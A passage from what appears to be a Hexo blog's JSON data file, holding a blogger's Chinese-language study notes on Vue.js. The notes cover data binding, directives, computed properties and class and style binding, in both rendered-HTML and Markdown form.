class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;toShow&quot;</span>&gt;</span>点击显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <br>   methods:&#123;<br>              notToShow:function()&#123;<br>                  this.show=false<br>              &#125;,<br>              toShow:function()&#123;<br>                  this.show=true<br>              &#125;<br></code></pre></td></tr></table></figure>\n\n<p>​    4.v-model:绑定数据</p>\n<p>​      </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>          Name：&#123;&#123; good.name &#125;&#125;<br>          Price: &#123;&#123; good.price &#125;&#125;<br>          Count: &#123;&#123; good.count &#125;&#125;<br><br>          All in: &#123;&#123; all_price &#125;&#125;<br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>新价格：<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;good.price&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">br</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>新数量：<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;good.count&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>4.语法糖</p>\n<p>​    （1）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">#v-on ===&gt; @<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br><br>#v-bindd ===&gt; :<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;#&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;#&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Ch1\"><a href=\"#Ch1\" class=\"headerlink\" title=\"Ch1\"></a>Ch1</h1><p>功能：</p>\n<p>解耦视图与数据</p>\n<p>可复用组件</p>\n<p>前端路由</p>\n<p>状态管理</p>\n<p>虚拟Dom</p>\n<h3 id=\"1-MVVM模式（Model-View-View-Model）\"><a href=\"#1-MVVM模式（Model-View-View-Model）\" class=\"headerlink\" title=\"1.MVVM模式（Model-View-View-Model）\"></a>1.MVVM模式（Model-View-View-Model）</h3><h1 id=\"Ch2\"><a href=\"#Ch2\" class=\"headerlink\" title=\"Ch2\"></a>Ch2</h1><h2 id=\"一、Vue实例与数据绑定\"><a href=\"#一、Vue实例与数据绑定\" class=\"headerlink\" title=\"一、Vue实例与数据绑定\"></a>一、Vue实例与数据绑定</h2><h3 id=\"1-数据绑定\"><a href=\"#1-数据绑定\" class=\"headerlink\" title=\"1.数据绑定\"></a>1.数据绑定</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    \t//插值&#123;&#123;&#125;&#125;<br>        Welcome to home:&#123;&#123; home &#125;&#125;<br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">home</span>:<span class=\"hljs-string\">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-生命周期\"><a href=\"#2-生命周期\" class=\"headerlink\" title=\"2.生命周期\"></a>2.生命周期</h3><p>​    a.created:完成数据观测，未挂载；</p>\n<p>​    b.mounted：el挂载到实例；</p>\n<p>​    c.beforeDestory：实例销毁前，解绑addEventListener监听事件等；</p>\n<h3 id=\"3-v-html\"><a href=\"#3-v-html\" class=\"headerlink\" title=\"3.v-html\"></a>3.v-html</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">v-html</span>=<span class=\"hljs-string\">&quot;html1&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">home</span>:<span class=\"hljs-string\">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">html1</span>:<span class=\"hljs-string\">&#x27;&lt;a href=&quot;http://www.lishengwang.top&quot;&gt;Click!&lt;/a&gt;&#x27;</span></span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-filter过滤器\"><a href=\"#4-filter过滤器\" class=\"headerlink\" title=\"4.filter过滤器\"></a>4.filter过滤器</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&#123;&#123; a|b &#125;&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"二、指令与事件\"><a href=\"#二、指令与事件\" class=\"headerlink\" title=\"二、指令与事件\"></a>二、指令与事件</h2><p>​    1.v-if</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <br> data:&#123;<br>              show:true<br>          &#125;,<br></code></pre></td></tr></table></figure>\n\n<p>​    2.v-bind:绑定数据，随数据变化进行更新</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;home&quot;</span>&gt;</span>V-bind<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    3.v-on：绑定事件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;toShow&quot;</span>&gt;</span>点击显示<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <br>   methods:&#123;<br>              notToShow:function()&#123;<br>                  this.show=false<br>              &#125;,<br>              toShow:function()&#123;<br>                  this.show=true<br>              &#125;<br></code></pre></td></tr></table></figure>\n\n<p>​    4.v-model:绑定数据</p>\n<p>​      </p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br>          Name：&#123;&#123; good.name &#125;&#125;<br>          Price: &#123;&#123; good.price &#125;&#125;<br>          Count: &#123;&#123; good.count &#125;&#125;<br><br>          All in: &#123;&#123; all_price &#125;&#125;<br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span><br><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>新价格：<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;good.price&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">br</span>&gt;</span><br>          <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>新数量：<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> <span class=\"hljs-attr\">v-model</span>=<span class=\"hljs-string\">&quot;good.count&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br>      <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>4.语法糖</p>\n<p>​    （1）</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\">#v-on ===&gt; @<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> <span class=\"hljs-attr\">v-on:click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">button</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">button</span>&gt;</span><br><br>#v-bindd ===&gt; :<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;#&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">:href</span>=<span class=\"hljs-string\">&quot;#&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n"},{"title":"Vue.js实战（2）","date":"2020-11-18T13:33:45.000Z","mp3":null,"cover":"img/vue_js_shizhan.jpg","_content":"\n\n# Ch3 计算属性\n\n1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n\n```\n  <div>\n            {{ reversedText }}\n        </div>\n\n  <script>\n            data:{\n                text: '123,456',\n            },\n            computed:{\n                reversedText: function(){\n                    return this.text.split(',').reverse().join(',');\n                }\n</script>\n```\n\n2.用法\n\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n\n3.和methods的区别\n\n```\n<div>\n    {{ reversedText }}\n</div>\n\n<scirpt>\n    methods:{\n        reverserText:function(){\n            return this.text.split(',').reverser().join(',');\n        }\n    },\n    computed:{\n         reversedText: function(){\n             return this.text.split(',').reverse().join(',');\n    }\n</scirpt>\n```\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\n\n# CH4 v-bind及class与style的绑定\n\n1.v-bind指令\n\n```\n<div>\n    <a v-bind:href=\"url\">链接</a>\n    <img v-bind:src:=\"imageUrl\"/>\n\n     <a :href=\"url\">链接</a>\n    <img :src=\"imageUrl\"/>\n</div>\n\n<script>\n    data:{\n        url:'...',\n        imageUrl:'...',\n    }\n</script>\n```\n\n2.绑定class的几种方法\n\n （1）表达式为真，则加载css\n\n```\n        <div :class=\"{ 'active':isActive,'error':isError }\"></div>\n\n       <script>\n        data:{\n             isActive: true,\n             isError:false,\n        }\n        </script>\n```\n\n （2）使用computed\n\n```\n    <div :class=\"classes\"></div>\n\n    <script>\n        computed:function(){\n            return:{\n                active:this.isActive,\n            }\n        }\n    </script>\n```\n\n (3)组件上使用\n\n\n\n```\n  <style>\n        .article{\n            color: red;\n        }\n        .active{\n            color: black;\n            font-size: 30px;\n        }\n    </style>\n\n <div id=\"app\">\n        <my-component :class=\"{ 'active': isActive }\"></my-component>\n    </div>>\n\n<script>\n    Vue.component('my-component',{\n        template:'<p class=\"article\">这是一个组件</p>'\n    })\n    var app=new Vue({\n        el:'#app',\n        data:{\n            isActive:true\n        }\n    })\n</script>\n```\n\n3.绑定内联样式\n\n```\n<div :style=\"styles\">\n            这是第二个组件\n        </div>\n\n  data:{\n            isActive:true,\n            styles:{\n                color:'pink',\n                fontSize: 35 +'px'\n            }\n        }\n```\n\n\n\n \n\n","source":"_posts/Vue.js实战（2）.md","raw":"---\ntitle: Vue.js实战（2）\ndate: 2020-11-18 21:33:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/vue_js_shizhan.jpg\n---\n\n\n# Ch3 计算属性\n\n1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n\n```\n  <div>\n            {{ reversedText }}\n        </div>\n\n  <script>\n            data:{\n                text: '123,456',\n            },\n            computed:{\n                reversedText: function(){\n                    return this.text.split(',').reverse().join(',');\n                }\n</script>\n```\n\n2.用法\n\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n\n3.和methods的区别\n\n```\n<div>\n    {{ reversedText }}\n</div>\n\n<scirpt>\n    methods:{\n        reverserText:function(){\n            return this.text.split(',').reverser().join(',');\n        }\n    },\n    computed:{\n         reversedText: function(){\n             return this.text.split(',').reverse().join(',');\n    }\n</scirpt>\n```\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\n\n# CH4 v-bind及class与style的绑定\n\n1.v-bind指令\n\n```\n<div>\n    <a v-bind:href=\"url\">链接</a>\n    <img v-bind:src:=\"imageUrl\"/>\n\n     <a :href=\"url\">链接</a>\n    <img :src=\"imageUrl\"/>\n</div>\n\n<script>\n    data:{\n        url:'...',\n        imageUrl:'...',\n    }\n</script>\n```\n\n2.绑定class的几种方法\n\n （1）表达式为真，则加载css\n\n```\n        <div :class=\"{ 'active':isActive,'error':isError }\"></div>\n\n       <script>\n        data:{\n             isActive: true,\n             isError:false,\n        }\n        </script>\n```\n\n （2）使用computed\n\n```\n    <div :class=\"classes\"></div>\n\n    <script>\n        computed:function(){\n            return:{\n                active:this.isActive,\n            }\n        }\n    </script>\n```\n\n (3)组件上使用\n\n\n\n```\n  <style>\n        .article{\n            color: red;\n        }\n        .active{\n            color: black;\n            font-size: 30px;\n        }\n    </style>\n\n <div id=\"app\">\n        <my-component :class=\"{ 'active': isActive }\"></my-component>\n    </div>>\n\n<script>\n    Vue.component('my-component',{\n        template:'<p class=\"article\">这是一个组件</p>'\n    })\n    var app=new Vue({\n        el:'#app',\n        data:{\n            isActive:true\n        }\n    })\n</script>\n```\n\n3.绑定内联样式\n\n```\n<div :style=\"styles\">\n            这是第二个组件\n        </div>\n\n  data:{\n            isActive:true,\n            styles:{\n                color:'pink',\n                fontSize: 35 +'px'\n            }\n        }\n```\n\n\n\n \n\n","slug":"Vue.js实战（2）","published":1,"updated":"2020-11-20T09:45:48.000Z","_id":"clg29vygh001wao9cahz07085","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch3-计算属性\"><a href=\"#Ch3-计算属性\" class=\"headerlink\" title=\"Ch3 计算属性\"></a>Ch3 计算属性</h1><p>1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；</p>\n<figure class=\"highlight handlebars\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs handlebars\"><span class=\"language-xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\">            </span><span class=\"hljs-template-variable\">&#123;&#123; <span class=\"hljs-name\">reversedText</span> &#125;&#125;</span><span class=\"language-xml\"></span><br><span class=\"language-xml\">        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span></span><br><span class=\"language-xml\"></span><br><span class=\"language-xml\">  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"hljs-attr\">data</span>:&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">&#x27;123,456&#x27;</span>,</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            &#125;,</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">            <span class=\"hljs-attr\">computed</span>:&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">text</span>.<span class=\"hljs-title function_\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-title function_\">reverse</span>().<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>);</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\">                &#125;</span></span><br><span class=\"language-javascript\"><span class=\"language-xml\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>2.用法</p>\n<p>计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；</p>\n<p>3.和methods的区别</p>\n<figure class=\"highlight arcade\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">&lt;div&gt;<br>    &#123;&#123; reversedText &#125;&#125;<br>&lt;/div&gt;<br><br>&lt;scirpt&gt;<br>    methods:&#123;<br>        <span class=\"hljs-attr\">reverserText</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-keyword\">return</span> this.<span class=\"hljs-built_in\">text</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).reverser().join(<span class=\"hljs-string\">&#x27;,&#x27;</span>);<br>        &#125;<br>    &#125;,<br>    <span class=\"hljs-attr\">computed</span>:&#123;<br>         <span class=\"hljs-attr\">reversedText</span>: <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>             <span class=\"hljs-keyword\">return</span> this.<span class=\"hljs-built_in\">text</span>.<span class=\"hljs-built_in\">split</span>(<span class=\"hljs-string\">&#x27;,&#x27;</span>).<span class=\"hljs-built_in\">reverse</span>().join(<span class=\"hljs-string\">&#x27;,&#x27;</span>);<br>    &#125;<br>&lt;/scirpt&gt;<br></code></pre></td></tr></table></figure>\n\n<p>两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；</p>\n<p>当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；</p>\n<h1 id=\"CH4-v-bind及class与style的绑定\"><a href=\"#CH4-v-bind及class与style的绑定\" class=\"headerlink\" title=\"CH4 v-bind及class与style的绑定\"></a>CH4 v-bind及class与style的绑定</h1><p>1.v-bind指令</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 